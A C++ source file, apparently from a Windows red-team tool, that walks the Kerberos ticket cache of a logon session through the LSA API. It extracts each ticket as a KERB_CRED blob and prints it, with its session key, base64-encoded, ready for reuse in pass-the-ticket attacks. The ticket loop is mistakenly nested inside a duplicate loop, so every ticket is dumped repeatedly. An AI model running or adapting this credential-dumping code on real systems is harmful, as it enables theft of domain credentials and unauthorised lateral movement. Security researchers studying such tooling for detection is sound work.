#include "stuff.h"

VOID filetimeToTime(const FILETIME* time) {
	SYSTEMTIME st;
	FileTimeToSystemTime(time, &st);
	std::cout << st.wDay << "." << st.wMonth << "." << st.wYear << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond << std::endl;
}

VOID ParseTktFlags(ULONG flags) {
	DWORD i;
	for (i = 0; i < ARRAYSIZE(TicketFlagsToStrings); i++)
		if ((flags >> (i + 16)) & 1)
			std::wcout << TicketFlagsToStrings[i] << ", ";
	std::wcout << std::endl;
}
void printUnicodeStringBuffer(UNICODE_STRING& unicodeString) {
	if (unicodeString.Buffer != nullptr) {
		wprintf(L"%.*s\n", unicodeString.Length / sizeof(wchar_t), unicodeString.Buffer);
	}
}
void GetSessionKeyType(LONG KeyType) {
	switch (KeyType) {
	case KERB_ETYPE_NULL:
		std::wcout << L"KERB_ETYPE_NULL" << std::endl;
		break;
	case KERB_ETYPE_DES_CBC_CRC:
		std::wcout << L"KERB_ETYPE_DES_CBC_CRC" << std::endl;
		break;
	case KERB_ETYPE_DES_CBC_MD4:
		std::wcout << L"KERB_ETYPE_DES_CBC_MD4" << std::endl;
		break;
	case KERB_ETYPE_RC4_HMAC_NT:
		std::wcout << L"KERB_ETYPE_RC4_HMAC_NT" << std::endl;
		break;
	case KERB_ETYPE_DES_CBC_MD5:
		std::wcout << L"KERB_ETYPE_DES_CBC_MD5" << std::endl;
		break;
	case KERB_ETYPE_RC4_MD4:
		std::wcout << L"KERB_ETYPE_RC4_MD4" << std::endl;
		break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
		std::wcout << L"KERB_ETYPE_AES256_CTS_HMAC_SHA1_96" << std::endl;
		break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
		std::wcout << L"KERB_ETYPE_AES128_CTS_HMAC_SHA1_96" << std::endl;
		break;
	case 129:
		std::wcout << L"KERB_ETYPE_RC4_MD5" << std::endl;
		break;
	case 130:
		std::wcout << L"KERB_ETYPE_RC2_MD4" << std::endl;
		break;
	case 131:
		std::wcout << L"KERB_ETYPE_RC2_MD5" << std::endl;
		break;
	default:
		std::wcout << L"Unknown\t(" << KeyType << ")" << std::endl;
		break;
	}
}
void printExternalName(KERB_EXTERNAL_NAME& externalName, const wchar_t* Paramname) {
	std::wcout << "\t\t" << Paramname << " (Type): ";
	switch (externalName.NameType) {
	case 0:
		std::wcout << "KRB_NT_UNKNOWN" << std::endl;
		break;
	case 1:
		std::wcout << "KRB_NT_PRINCIPAL" << std::endl;
		break;
	case -131:
		std::wcout << "KRB_NT_PRINCIPAL_AND_ID" << std::endl;
		break;
	case 2:
		std::wcout << "KRB_NT_SRV_INST" << std::endl;
		break;
	case -132:
		std::wcout << "KRB_NT_SRV_INST_AND_ID" << std::endl;
		break;
	case 3:
		std::wcout << "KRB_NT_SRV_HST" << std::endl;
		break;
	case 4:
		std::wcout << "KRB_NT_SRV_XHST" << std::endl;
		break;
	case 5:
		std::wcout << "KRB_NT_UID " << std::endl;
		break;
	case 10:
		std::wcout << "KRB_NT_ENTERPRISE_PRINCIPAL" << std::endl;
		break;
	case -130:
		std::wcout << "KRB_NT_ENT_PRINCIPAL_AND_ID" << std::endl;
		break;
	default:
		std::wcout << "Unknown(" << externalName.NameType << ")" << std::endl;
		break;
	}
	for (USHORT i = 0; i < externalName.NameCount; i++) {
		UNICODE_STRING& unicodeString = externalName.Names[i];
		wprintf(L"\t\t%ws %d: ", Paramname, i + 1);
		printUnicodeStringBuffer(unicodeString);
	}
}
PCSTR KerberosEncryptionType(LONG eType)
{
	PCSTR type;
	switch (eType)
	{
	case KERB_ETYPE_NULL:							type = "null             "; break;
	case KERB_ETYPE_DES_PLAIN:						type = "des_plain        "; break;
	case KERB_ETYPE_DES_CBC_CRC:					type = "des_cbc_crc      "; break;
	case KERB_ETYPE_DES_CBC_MD4:					type = "des_cbc_md4      "; break;
	case KERB_ETYPE_DES_CBC_MD5:					type = "des_cbc_md5      "; break;
	case KERB_ETYPE_DES_CBC_MD5_NT:					type = "des_cbc_md5_nt   "; break;
	case KERB_ETYPE_RC4_PLAIN:						type = "rc4_plain        "; break;
	case KERB_ETYPE_RC4_PLAIN2:						type = "rc4_plain2       "; break;
	case KERB_ETYPE_RC4_PLAIN_EXP:					type = "rc4_plain_exp    "; break;
	case KERB_ETYPE_RC4_LM:							type = "rc4_lm           "; break;
	case KERB_ETYPE_RC4_MD4:						type = "rc4_md4          "; break;
	case KERB_ETYPE_RC4_SHA:						type = "rc4_sha          "; break;
	case KERB_ETYPE_RC4_HMAC_NT:					type = "rc4_hmac_nt      "; break;
	case KERB_ETYPE_RC4_HMAC_NT_EXP:				type = "rc4_hmac_nt_exp  "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD:					type = "rc4_plain_old    "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD_EXP:				type = "rc4_plain_old_exp"; break;
	case KERB_ETYPE_RC4_HMAC_OLD:					type = "rc4_hmac_old     "; break;
	case KERB_ETYPE_RC4_HMAC_OLD_EXP:				type = "rc4_hmac_old_exp "; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN:	type = "aes128_hmac_plain"; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN:	type = "aes256_hmac_plain"; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:		type = "aes128_hmac      "; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:		type = "aes256_hmac      "; break;
	default:										type = "unknow           "; break;
	}
	return type;
}

bool containsKrbtgt(const UNICODE_STRING& unicodeStr) {
	std::wstring wstr(unicodeStr.Buffer, unicodeStr.Length / sizeof(WCHAR));
	std::string str(wstr.begin(), wstr.end());
	std::transform(str.begin(), str.end(), str.begin(), ::tolower);

	if (str.find("krbtgt") != std::string::npos) {
		return true;
	}
	else { return false; }
}

LSA_STRING* create_lsa_string(const char* value)
{
	char* buf = new char[100];
	LSA_STRING* str = (LSA_STRING*)buf;
	str->Length = strlen(value);
	str->MaximumLength = str->Length;
	str->Buffer = buf + sizeof(LSA_STRING);
	memcpy(str->Buffer, value, str->Length);
	return str;
}
std::string base64_encode(const unsigned char* bytes_to_encode, size_t in_len) {
	std::string out;

	int val = 0, valb = -6;
	for (size_t i = 0; i < in_len; ++i) {
		unsigned char c = bytes_to_encode[i];
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(base64_chars[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4) out.push_back('=');

	return out;
}
DWORD ReceiveLogonInfo(HANDLE LsaHandle, LUID LogonId, ULONG kerberosAP) {
	KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = { KerbQueryTicketCacheMessage, LogonId };
	PKERB_QUERY_TKT_CACHE_RESPONSE pKerbCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	ULONG krbQTCacheSizeResponse = 0;
	NTSTATUS ProtocolStatus = 0;
	NTSTATUS status = LsaCallAuthenticationPackage(LsaHandle, kerberosAP, &kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID*)&pKerbCacheResponse, &krbQTCacheSizeResponse, &ProtocolStatus);
	if (status == 0) {
		if (ProtocolStatus == 0) {
			std::wcout << L"\t[+] Enumerated " << pKerbCacheResponse->CountOfTickets << L" Tickets" << std::endl;
			for (int i = 0; i < pKerbCacheResponse->CountOfTickets; i++) {
				for (int i = 0; i < pKerbCacheResponse->CountOfTickets; i++) {
					std::wcout << L"\tTICKET [" << i + 1 << L"]:" << std::endl;
					std::wcout << L"\t\tServer Name:\t" << pKerbCacheResponse->Tickets[i].ServerName.Buffer << std::endl;
					std::wcout << L"\t\tRealm Name:\t" << pKerbCacheResponse->Tickets[i].RealmName.Buffer << std::endl;
					std::wcout << L"\t\tStart Time:\t"; filetimeToTime((PFILETIME)&pKerbCacheResponse->Tickets[i].StartTime);
					std::wcout << L"\t\tEnd Time:\t"; filetimeToTime((PFILETIME)&pKerbCacheResponse->Tickets[i].EndTime);
					std::wcout << L"\t\tRenew Time:\t"; filetimeToTime((PFILETIME)&pKerbCacheResponse->Tickets[i].RenewTime);
					if (containsKrbtgt(pKerbCacheResponse->Tickets[i].ServerName)) {
						std::wcout << L"\t\tTGT:\t TRUE" << std::endl;
					}
					else {
						std::wcout << L"\t\tTGS:\t TRUE" << std::endl;
					}
					std::wcout << L"\t\tEncryptionType:\t" << KerberosEncryptionType(pKerbCacheResponse->Tickets[i].EncryptionType) << std::endl;
					std::wcout << L"\t\tTicket Flags:\t"; ParseTktFlags(pKerbCacheResponse->Tickets[i].TicketFlags);
					DWORD szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
					if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData)) {
						pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
						pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
						pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
						pKerbRetrieveRequest->LogonId = kerbCacheRequest.LogonId;
						pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
						RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);
						status = LsaCallAuthenticationPackage(LsaHandle, kerberosAP, pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &ProtocolStatus);
						if (status == 0) {
							if (ProtocolStatus == 0) {
								if (pKerbRetrieveResponse->Ticket.TargetName) { // Может быть равен NULL
									printExternalName(*pKerbRetrieveResponse->Ticket.TargetName, L"TargetName");
								}
								SYSTEMTIME st;
								FileTimeToSystemTime((PFILETIME)&pKerbRetrieveResponse->Ticket.TimeSkew, &st);
								std::wcout << L"\t\tTimeSkew:\t" << st.wHour << ":" << st.wMinute << ":" << st.wSecond << std::endl;
								printExternalName(*pKerbRetrieveResponse->Ticket.ServiceName, L"ServiceName");
								printExternalName(*pKerbRetrieveResponse->Ticket.ClientName, L"ClientName");
								std::wcout << L"\t\tDomainName:\t";
								printUnicodeStringBuffer(pKerbRetrieveResponse->Ticket.DomainName);
								std::wcout << L"\t\tTargetDomainName:\t";
								printUnicodeStringBuffer(pKerbRetrieveResponse->Ticket.TargetDomainName);
								std::wcout << L"\t\tAltTargetName:\t";
								printUnicodeStringBuffer(pKerbRetrieveResponse->Ticket.AltTargetDomainName);
								std::cout << "\t\tSession key: (b64) " << base64_encode(pKerbRetrieveResponse->Ticket.SessionKey.Value, pKerbRetrieveResponse->Ticket.SessionKey.Length) << std::endl;
								std::cout << "\t\tSessionKeyType:\t"; GetSessionKeyType(pKerbRetrieveResponse->Ticket.SessionKey.KeyType);
								std::cout << "\t\tTicket (with Session Key): " << base64_encode(pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize) << std::endl;

								pKerbRetrieveRequest->MessageType = KerbRetrieveTicketMessage;
								status = LsaCallAuthenticationPackage(LsaHandle, kerberosAP, pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &ProtocolStatus);
								if (status == 0) {
									if (ProtocolStatus == 0) {
										std::cout << "\t\tTicket (without Session Key): " << base64_encode(pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize) << std::endl;
										std::cout << "\t\tSession key for ticket w/out session key: (b64) " << base64_encode(pKerbRetrieveResponse->Ticket.SessionKey.Value, pKerbRetrieveResponse->Ticket.SessionKey.Length) << std::endl;
										std::cout << "\t\tSessionKeyType:\t"; GetSessionKeyType(pKerbRetrieveResponse->Ticket.SessionKey.KeyType);
									}
									else {
#ifdef DEBUG		
										ULONG Stats = LsaNtStatusToWinError(ProtocolStatus);
										if (Stats == 1312) {
											std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Protocol Error (Getting TKT without session key): " << Stats << " (ERROR_NO_SUCH_LOGON_SESSION)" << std::endl;
										}
										else {
											std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Protocol Error ((Getting TKT without session key)): " << Stats << std::endl;
										}
#endif
									}
								}
								else {
#ifdef DEBUG
									ULONG Stats = LsaNtStatusToWinError(status);
									std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Func Error ((Getting TKT without session key)): " << Stats << std::endl;
#endif
								}
							}
							else {
#ifdef DEBUG				
								ULONG Stats = LsaNtStatusToWinError(ProtocolStatus);
								if (Stats == 1312) {
									std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Protocol Error: " << Stats << " (ERROR_NO_SUCH_LOGON_SESSION)" << std::endl;
								}
								else {
									std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Protocol Error: " << Stats << std::endl;
								}
#endif
							}
						}
						else {
#ifdef DEBUG
							ULONG Stats = LsaNtStatusToWinError(status);
							std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Func Error: " << Stats << std::endl;
#endif
						}
						LocalFree(pKerbRetrieveRequest);
					}
				}
			}
		}
		else {
#ifdef DEBUG
			ULONG Stats = LsaNtStatusToWinError(ProtocolStatus);
			if (Stats == 1312) {
				std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Protocol Error: " << Stats << " (ERROR_NO_SUCH_LOGON_SESSION)" << std::endl;
			}
			else {
				std::cout << "[-] KERB_RETRIEVE_TKT_REQUEST Protocol Error: " << Stats << std::endl;
			}

#endif
		}
	}
	else {
#ifdef DEBUG
		ULONG Stats = LsaNtStatusToWinError(status);
		std::cout << L"[-] KERB_QUERY_TKT_CACHE_REQUEST Func Error: " << Stats << std::endl;
#endif	
	}
	return 1;
}